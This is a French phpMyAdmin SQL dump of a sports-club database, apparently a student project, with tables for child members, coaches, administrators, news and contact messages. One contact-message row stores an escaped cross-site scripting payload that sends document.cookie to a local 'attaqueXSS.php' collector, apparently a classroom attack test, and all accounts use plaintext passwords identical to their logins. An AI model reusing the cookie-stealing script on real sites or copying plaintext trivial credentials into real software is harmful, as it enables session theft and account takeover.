-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1:3306
-- Généré le : mer. 15 déc. 2021 à 07:41
-- Version du serveur : 8.0.25
-- Version de PHP : 8.0.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `clubaussonne`
--

-- --------------------------------------------------------

--
-- Structure de la table `adherent`
--
CREATE DATABASE IF NOT EXISTS clubaussonne;
USE clubaussonne;

DROP TABLE IF EXISTS `adherent`;
CREATE TABLE IF NOT EXISTS `adherent` (
  `idAdherent` int NOT NULL AUTO_INCREMENT,
  `nomAdherent` char(32) NOT NULL,
  `prenomAdherent` char(32) NOT NULL,
  `ageAdherent` int NOT NULL,
  `sexeAdherent` char(1) NOT NULL,
  `loginAdherent` char(20) NOT NULL,
  `pwdAdherent` char(20) NOT NULL,
  PRIMARY KEY (`idAdherent`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `adherent`
--

INSERT INTO `adherent` (`idAdherent`, `nomAdherent`, `prenomAdherent`, `ageAdherent`, `sexeAdherent`, `loginAdherent`, `pwdAdherent`) VALUES
(1, 'Dupont', 'Pierre', 8, 'F', 'pDupont', 'pDupont'),
(2, 'Dubois', 'Vincent', 10, 'M', 'vDubois', 'vDubois'),
(3, 'Durant', 'Jacques', 6, 'M', 'jDurant', 'jDurant'),
(4, 'Fleur', 'Sophie', 7, 'F', 'sFleur', 'sFleur');

-- --------------------------------------------------------

--
-- Structure de la table `adherentequipe`
--

DROP TABLE IF EXISTS `adherentequipe`;
CREATE TABLE IF NOT EXISTS `adherentequipe` (
  `idAdherent` int NOT NULL,
  `idEquipe` int NOT NULL,
  PRIMARY KEY (`idAdherent`,`idEquipe`),
  KEY `fk_AdherentEquipe_idEquipe` (`idEquipe`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `adherentequipe`
--

INSERT INTO `adherentequipe` (`idAdherent`, `idEquipe`) VALUES
(1, 1),
(1, 2),
(2, 2),
(1, 3),
(2, 3),
(3, 3),
(2, 4),
(3, 4),
(3, 5),
(4, 5),
(4, 6);

--
-- Déclencheurs `adherentequipe`
--
DROP TRIGGER IF EXISTS `ajout_AdherentEquipe`;
DELIMITER $$
CREATE TRIGGER `ajout_AdherentEquipe` AFTER INSERT ON `adherentequipe` FOR EACH ROW BEGIN
declare nombreAdherent int default 0;
set nombreAdherent = (select count(*) from adherentequipe where idAdherent = new.idAdherent);
if nombreAdherent > 3
       THEN
       delete from adherentequipe where idAdherent = new.idAdherent and idEquipe = new.idEquipe;
    END IF;
END
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Structure de la table `administrateur`
--

DROP TABLE IF EXISTS `administrateur`;
CREATE TABLE IF NOT EXISTS `administrateur` (
  `idAdmin` int NOT NULL AUTO_INCREMENT,
  `nomAdmin` char(32) NOT NULL,
  `prenomAdmin` char(32) NOT NULL,
  `loginAdmin` char(20) NOT NULL,
  `pwdAdmin` char(20) NOT NULL,
  PRIMARY KEY (`idAdmin`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `administrateur`
--

INSERT INTO `administrateur` (`idAdmin`, `nomAdmin`, `prenomAdmin`, `loginAdmin`, `pwdAdmin`) VALUES
(1, 'LeFirst', 'Vincent', 'admin', 'admin'),
(2, 'LeSecond', 'Pierre', 'admin2', 'admin2');

-- --------------------------------------------------------

--
-- Structure de la table `entraineur`
--

DROP TABLE IF EXISTS `entraineur`;
CREATE TABLE IF NOT EXISTS `entraineur` (
  `idEntraineur` int NOT NULL AUTO_INCREMENT,
  `nomEntraineur` char(32) NOT NULL,
  `loginEntraineur` char(20) NOT NULL,
  `pwdEntraineur` char(20) NOT NULL,
  PRIMARY KEY (`idEntraineur`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `entraineur`
--

INSERT INTO `entraineur` (`idEntraineur`, `nomEntraineur`, `loginEntraineur`, `pwdEntraineur`) VALUES
(1, 'Delbert', 'Delbert', 'Delbert'),
(2, 'Dubois', 'Dubois', 'Dubois'),
(3, 'Bousquet', 'Bousquet', 'Bousquet');

-- --------------------------------------------------------

--
-- Structure de la table `entraineurspecialite`
--

DROP TABLE IF EXISTS `entraineurspecialite`;
CREATE TABLE IF NOT EXISTS `entraineurspecialite` (
  `idEntraineur` int NOT NULL,
  `idSpecialite` int NOT NULL,
  PRIMARY KEY (`idEntraineur`,`idSpecialite`),
  KEY `fk_EntraineurSpecialite_idSpecialite` (`idSpecialite`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `entraineurspecialite`
--

INSERT INTO `entraineurspecialite` (`idEntraineur`, `idSpecialite`) VALUES
(1, 1),
(1, 2),
(1, 3),
(2, 4),
(2, 5),
(3, 6),
(3, 7);

-- --------------------------------------------------------

--
-- Structure de la table `equipe`
--

DROP TABLE IF EXISTS `equipe`;
CREATE TABLE IF NOT EXISTS `equipe` (
  `idEquipe` int NOT NULL AUTO_INCREMENT,
  `nomEquipe` char(32) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `nbrPlaceEquipe` int NOT NULL,
  `ageMinEquipe` int NOT NULL,
  `ageMaxEquipe` int NOT NULL,
  `sexeEquipe` char(1) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `idEntraineur` int DEFAULT NULL,
  `idSpecialite` int DEFAULT NULL,
  PRIMARY KEY (`idEquipe`),
  KEY `fk_specialiteEquipe` (`idSpecialite`),
  KEY `fk_identraineurEquipe` (`idEntraineur`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `equipe`
--

INSERT INTO `equipe` (`idEquipe`, `nomEquipe`, `nbrPlaceEquipe`, `ageMinEquipe`, `ageMaxEquipe`, `sexeEquipe`, `idEntraineur`, `idSpecialite`) VALUES
(1, 'Les dauphins volants', 10, 0, 8, 'F', 1, 1),
(2, 'Inter milan', 20, 10, 12, 'F', 1, 3),
(3, 'Les petits judoka', 10, 5, 8, 'F', 1, 2),
(4, 'Grand galop', 10, 5, 8, 'F', 3, 7),
(5, 'SHVB', 10, 5, 8, 'F', 2, 4),
(6, 'Les petits athlètes', 10, 5, 8, 'F', 3, 6),
(7, 'Les bikers', 10, 5, 8, 'F', 2, 5),
(8, 'Test', 10, 0, 45, 'M', 3, 1);

--
-- Déclencheurs `equipe`
--
DROP TRIGGER IF EXISTS `EntraineurEquipe`;
DELIMITER $$
CREATE TRIGGER `EntraineurEquipe` AFTER INSERT ON `equipe` FOR EACH ROW BEGIN
declare nombreEquipe int default 0;
set nombreEquipe = (Select count(*) From equipe where idEntraineur=New.idEntraineur);
    IF nombreEquipe>3
      THEN
       delete from equipe where idEntraineur=new.idEntraineur and idEquipe=new.idEquipe;
    END IF;
END
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Structure de la table `message`
--

DROP TABLE IF EXISTS `message`;
CREATE TABLE IF NOT EXISTS `message` (
  `idMessage` int NOT NULL AUTO_INCREMENT,
  `emailContact` char(40) NOT NULL,
  `messageContact` char(200) NOT NULL,
  PRIMARY KEY (`idMessage`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `message`
--

INSERT INTO `message` (`idMessage`, `emailContact`, `messageContact`) VALUES
(1, 'cathy.delmas@laposte.net', 'test1'),
(2, 'cathy.delmas@laposte.net', 'test2'),
(4, 'test222', '&lt;script&gt; var Http = new XMLHttpRequest();\r\nvar url=\'http://127.0.0.1\\Moreau\\Ap Delmas\\attaqueXss\\attaqueXSS.php?c=\'+ encodeURI (document.cookie);Http.open(\'GET\', url);Http.send();\r\n&lt;/script&g');

-- --------------------------------------------------------

--
-- Structure de la table `nouvelle`
--

DROP TABLE IF EXISTS `nouvelle`;
CREATE TABLE IF NOT EXISTS `nouvelle` (
  `idNouvelle` int NOT NULL,
  `dateParutionNouvelle` date NOT NULL,
  `descriptionNouvelle` char(150) NOT NULL,
  `idTypeNouvelle` int NOT NULL,
  PRIMARY KEY (`idNouvelle`),
  KEY `fk_nouvelle_typeNouvelle` (`idTypeNouvelle`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `nouvelle`
--

INSERT INTO `nouvelle` (`idNouvelle`, `dateParutionNouvelle`, `descriptionNouvelle`, `idTypeNouvelle`) VALUES
(1, '2021-07-07', 'Une nouvelle équipe est née : la natation.\r\n', 1),
(2, '2021-07-18', 'L équipe de judo est qualifié pour le tournoi régional poid lourd.\r\n', 1),
(3, '2021-07-24', 'La vidéothèque sera ouverte dès le 20 Juillet.\r\n', 2),
(4, '2021-07-25', 'Réduction de 10% sur l abonnement pass cinéma de la commune.\r\n', 2),
(5, '2021-07-12', 'Nous venons de recevoir les nouveaux jeux du parc PERRAULT.\r\n', 3),
(6, '2021-07-10', 'Le tarif des entrées familles à la piscine ont baissé de 15% cette année.\r\n', 3),
(7, '2021-07-11', 'Organisation d un loto par le club du 3ème age. Tout le monde est le bienvenu.\r\n', 4),
(8, '2021-07-12', 'Le club couture organise une vente dans le hall de la Mairie le 20 juillet.\r\n', 4);

-- --------------------------------------------------------

--
-- Structure de la table `specialite`
--

DROP TABLE IF EXISTS `specialite`;
CREATE TABLE IF NOT EXISTS `specialite` (
  `idSpecialite` int NOT NULL,
  `libSpecialite` char(50) NOT NULL,
  PRIMARY KEY (`idSpecialite`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `specialite`
--

INSERT INTO `specialite` (`idSpecialite`, `libSpecialite`) VALUES
(1, 'natation'),
(2, 'judo'),
(3, 'foot'),
(4, 'volley'),
(5, 'moto-cross'),
(6, 'athlétisme'),
(7, 'équitation');

-- --------------------------------------------------------

--
-- Structure de la table `titulaire`
--

DROP TABLE IF EXISTS `titulaire`;
CREATE TABLE IF NOT EXISTS `titulaire` (
  `idEntraineur` int NOT NULL,
  `dateEmbauche` date NOT NULL,
  PRIMARY KEY (`idEntraineur`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `titulaire`
--

INSERT INTO `titulaire` (`idEntraineur`, `dateEmbauche`) VALUES
(1, '2019-10-10'),
(3, '2019-10-12');

-- --------------------------------------------------------

--
-- Structure de la table `typenouvelle`
--

DROP TABLE IF EXISTS `typenouvelle`;
CREATE TABLE IF NOT EXISTS `typenouvelle` (
  `idTypeNouvelle` int NOT NULL,
  `libelleTypeNouvelle` char(32) NOT NULL,
  PRIMARY KEY (`idTypeNouvelle`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `typenouvelle`
--

INSERT INTO `typenouvelle` (`idTypeNouvelle`, `libelleTypeNouvelle`) VALUES
(1, 'sport'),
(2, 'culture'),
(3, 'famille'),
(4, 'pratique');

-- --------------------------------------------------------

--
-- Structure de la table `vacataire`
--

DROP TABLE IF EXISTS `vacataire`;
CREATE TABLE IF NOT EXISTS `vacataire` (
  `idEntraineur` int NOT NULL,
  `telephoneVacataire` char(14) NOT NULL,
  PRIMARY KEY (`idEntraineur`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `vacataire`
--

INSERT INTO `vacataire` (`idEntraineur`, `telephoneVacataire`) VALUES
(2, '06.25.45.12.15');

--
-- Contraintes pour les tables déchargées
--

--
-- Contraintes pour la table `equipe`
--
ALTER TABLE `equipe`
  ADD CONSTRAINT `fk_identraineurEquipe` FOREIGN KEY (`idEntraineur`) REFERENCES `entraineur` (`idEntraineur`),
  ADD CONSTRAINT `fk_specialiteEquipe` FOREIGN KEY (`idSpecialite`) REFERENCES `specialite` (`idSpecialite`);

--
-- Contraintes pour la table `titulaire`
--
ALTER TABLE `titulaire`
  ADD CONSTRAINT `fk_titulaire_entraineur` FOREIGN KEY (`idEntraineur`) REFERENCES `entraineur` (`idEntraineur`);

--
-- Contraintes pour la table `vacataire`
--
ALTER TABLE `vacataire`
  ADD CONSTRAINT `fk_vacataire_entraineur` FOREIGN KEY (`idEntraineur`) REFERENCES `entraineur` (`idEntraineur`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
